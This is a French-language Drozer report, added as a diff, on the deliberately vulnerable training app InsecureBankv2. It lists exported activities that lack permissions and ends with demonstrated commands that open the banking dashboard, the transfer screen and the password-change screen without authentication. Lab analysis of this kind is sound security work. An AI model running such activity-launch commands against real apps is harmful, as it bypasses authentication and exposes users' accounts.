@@ -1,0 +1,59 @@
+================================================================================
+DROZER - ANALYSE DES ACTIVITÉS EXPORTÉES
+Application : com.android.insecurebankv2 (InsecureBankv2)
+Date        : [DATE_ANALYSE]
+Outil       : Drozer Framework v2.x
+Commande    : dz> run app.activity.info -a com.android.insecurebankv2 -i
+================================================================================
+
+Package: com.android.insecurebankv2
+
+  com.android.insecurebankv2.LoginActivity
+    Permission : null
+    IntentFilter:
+      Action   : android.intent.action.MAIN
+      Category : android.intent.category.LAUNCHER
+
+  com.android.insecurebankv2.PostLogin
+    Permission : null
+    IntentFilter: (aucun - exportée via android:exported="true")
+
+  com.android.insecurebankv2.DoTransfer
+    Permission : null
+    IntentFilter: (aucun - exportée via android:exported="true")
+
+  com.android.insecurebankv2.ViewStatement
+    Permission : null
+    IntentFilter: (aucun - exportée via android:exported="true")
+
+  com.android.insecurebankv2.ChangePassword
+    Permission : null
+    IntentFilter: (aucun - exportée via android:exported="true")
+
+  com.android.insecurebankv2.FilesActivity
+    Permission : null
+    IntentFilter: (aucun - exportée via android:exported="true")
+
+================================================================================
+RÉSUMÉ : 6 activités exportées — 6 sans aucune permission de protection
+================================================================================
+
+COMMANDES DE VÉRIFICATION EXÉCUTÉES :
+--------------------------------------
+dz> run app.activity.info -a com.android.insecurebankv2
+dz> run app.activity.info -a com.android.insecurebankv2 -i
+
+COMMANDES D'EXPLOITATION DÉMONTRÉES :
+--------------------------------------
+dz> run app.activity.start --component com.android.insecurebankv2 \
+    com.android.insecurebankv2.PostLogin
+→ RÉSULTAT : Dashboard bancaire accessible SANS authentification
+
+dz> run app.activity.start --component com.android.insecurebankv2 \
+    com.android.insecurebankv2.DoTransfer
+→ RÉSULTAT : Écran de virement accessible SANS authentification
+
+dz> run app.activity.start --component com.android.insecurebankv2 \
+    com.android.insecurebankv2.ChangePassword
+→ RÉSULTAT : Écran changement MDP accessible SANS authentification
+================================================================================
